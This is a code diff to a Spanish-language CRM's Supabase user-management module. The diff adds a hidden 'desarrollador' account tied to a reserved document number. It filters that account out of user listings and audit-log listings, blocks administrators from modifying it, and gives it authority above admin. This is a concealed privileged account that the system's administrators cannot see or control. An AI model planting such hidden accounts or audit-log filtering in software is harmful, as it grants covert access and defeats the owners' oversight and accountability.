@@ -4,7 +4,8 @@
  */
 import { supabaseClient } from './supabase.js';
 import { clasificarErrorSupabase } from '../utils/supabaseErrors.js';
-import { normalizarDocumento, getUsuarioActual } from './auth.js';
+import { normalizarDocumento, getUsuarioActual, esUsuarioOcultoCRM } from './auth.js';
+import { DOCUMENTO_DESARROLLADOR_OCULTO } from '../config/constants.js';
 
 function errorGestionUsuarios(error, data) {
     const mensaje = data?.error || data?.message || error?.message
@@ -50,7 +51,8 @@ export async function listarUsuarios() {
             return { data: [], error: clasificarErrorSupabase(error) };
         }
 
-        return { data: data || [], error: null };
+        const visibles = (Array.isArray(data) ? data : []).filter(u => !esUsuarioOcultoCRM(u));
+        return { data: visibles, error: null };
     } catch (err) {
         console.error('Error inesperado al listar usuarios:', err);
         return { data: [], error: clasificarErrorSupabase(err) };
@@ -79,6 +81,9 @@ export async function crearUsuario({ nombre, documento, password, rol }) {
     }
     if (!passwordLimpia || passwordLimpia.length < 6) {
         return { data: null, error: { titulo: 'Contraseña Inválida', mensaje: 'La contraseña inicial debe tener al menos 6 caracteres.' } };
+    }
+    if (docNormalizado === DOCUMENTO_DESARROLLADOR_OCULTO) {
+        return { data: null, error: { titulo: 'Documento Reservado', mensaje: 'No es posible registrar un usuario con este documento.' } };
     }
     if (!['admin', 'operador', 'lector'].includes(rolNormalizado)) {
         return { data: null, error: { titulo: 'Rol Inválido', mensaje: 'El rol seleccionado no es válido.' } };
@@ -160,14 +165,43 @@ export function puedeModificarUsuario(usuarioActual, usuarioObjetivo) {
         return { permitido: false, motivo: 'Usuario objetivo no encontrado.' };
     }
 
-    if (usuarioActual.rol !== 'admin') {
+    const rolActual = String(usuarioActual.rol || '').toLowerCase();
+    const rolObjetivo = String(usuarioObjetivo.rol || '').toLowerCase();
+
+    if (!['admin', 'desarrollador'].includes(rolActual)) {
         return {
             permitido: false,
             motivo: 'Acceso Denegado: Solo los administradores pueden modificar cuentas de usuario.'
         };
     }
 
-    if (usuarioObjetivo.rol !== 'admin') {
+    // Ningún usuario ajeno (incluyendo administradores) puede modificar al desarrollador ni a la cuenta oculta
+    if (esUsuarioOcultoCRM(usuarioObjetivo) && rolActual !== 'desarrollador') {
+        return {
+            permitido: false,
+            motivo: 'Acceso Denegado: No tienes permisos para modificar esta cuenta.'
+        };
+    }
+
+    // El desarrollador tiene jerarquía superior sobre admin, operador y lector
+    if (rolActual === 'desarrollador') {
+        if (usuarioActual.id === usuarioObjetivo.id) {
+            return {
+                permitido: false,
+                esMismoUsuario: true,
+                motivo: 'Acceso Denegado: No puedes modificar los privilegios ni el estado de tu propia cuenta.'
+            };
+        }
+        if (rolObjetivo === 'desarrollador') {
+            return {
+                permitido: false,
+                motivo: 'Acceso Denegado: No tienes permisos para modificar otra cuenta de desarrollador.'
+            };
+        }
+        return { permitido: true };
+    }
+
+    if (rolObjetivo !== 'admin') {
         if (usuarioActual.id === usuarioObjetivo.id) {
             return { permitido: true, esMismoUsuario: true };
         }
@@ -325,7 +359,8 @@ export async function listarAuditoria({ tabla, operacion, limite = 100 } = {}) {
             return { data: [], error: clasificarErrorSupabase(error) };
         }
 
-        return { data: data || [], error: null };
+        const visibles = (Array.isArray(data) ? data : []).filter(a => !esUsuarioOcultoCRM(a));
+        return { data: visibles, error: null };
     } catch (err) {
         console.error('Error inesperado al listar auditoría:', err);
         return { data: [], error: clasificarErrorSupabase(err) };
